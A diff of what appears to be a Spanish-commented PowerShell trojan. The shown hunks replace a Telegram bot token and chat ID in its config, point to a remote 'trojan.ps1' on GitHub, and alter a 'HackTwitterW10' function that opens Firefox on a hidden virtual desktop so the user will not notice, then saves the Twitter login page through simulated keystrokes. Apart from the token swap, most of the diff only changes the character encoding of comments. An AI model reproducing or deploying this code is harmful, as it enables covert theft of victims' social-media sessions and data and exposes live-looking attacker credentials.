@@ -4,8 +4,8 @@ $PSDefaultParameterValues['Invoke-WebRequest:UseBasicParsing'] = $true
 ## CONFIG ##
 ############
 
-$BotToken = "6938065138:AAHhQAubwoZ4TKy1IV_Io-DUWgcFh7CGlDU"
-$ChatID = '6617182890'
+$BotToken = "7200963951:AAEk2ZknQNcOMi6uF_sBotSQI1agm1XqJLw"
+$ChatID = '6542327314'
 $githubScript = 'https://raw.githubusercontent.com/Hiki0611/myfirstpoject/main/trojan.ps1'
 $ipv4Regex = '^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
 
@@ -303,8 +303,8 @@ function mainBrowser {
 
 function HackTwitterW10 {
     <#
-    Crear· un nuevo dekstop virtual e iniciar· ahÌ el firefox y guardar· el html, como es un desktop virtual el usuario no se enterar· de lo que pasa
-    Esta funcion solo es v·lida para W10.
+    Crear√° un nuevo dekstop virtual e iniciar√° ah√≠ el firefox y guardar√° el html, como es un desktop virtual el usuario no se enterar√° de lo que pasa
+    Esta funcion solo es v√°lida para W10.
     Manuales: 
         https://docs.microsoft.com/en-us/windows/desktop/inputdev/virtual-key-codes 
     #>
@@ -376,10 +376,10 @@ public static void SwitchRightVirtualDesktopInWin10()
     $wshell = New-Object -ComObject wscript.shell
     $KeyShortcut2::SwitchLeftVirtualDesktopInWin10()
 
-    # Espera 10 segundos a cargar completamente la p·gina
+    # Espera 10 segundos a cargar completamente la p√°gina
     Start-sleep -Seconds 10
 
-    # Activa la ventana con el nombre: 'Iniciar sesiÛn en Twitter'
+    # Activa la ventana con el nombre: 'Iniciar sesi√≥n en Twitter'
     $KeyShortcut3::SwitchRightVirtualDesktopInWin10()
     $wshell.AppActivate('twitter') 
     $wshell.SendKeys("^{s}") 
@@ -477,10 +477,10 @@ public static void SwitchRightVirtualDesktopInWin10()
     $wshell = New-Object -ComObject wscript.shell
     $KeyShortcut2::SwitchLeftVirtualDesktopInWin10()
 
-    # Espera 10 segundos a cargar completamente la p·gina
+    # Espera 10 segundos a cargar completamente la p√°gina
     Start-sleep -Seconds 10
 
-    # Activa la ventana con el nombre: 'Iniciar sesiÛn en Twitter'
+    # Activa la ventana con el nombre: 'Iniciar sesi√≥n en Twitter'
     $KeyShortcut3::SwitchRightVirtualDesktopInWin10()
     $wshell.AppActivate('Mozilla Firefox') 
     $wshell.SendKeys("^{s}") 
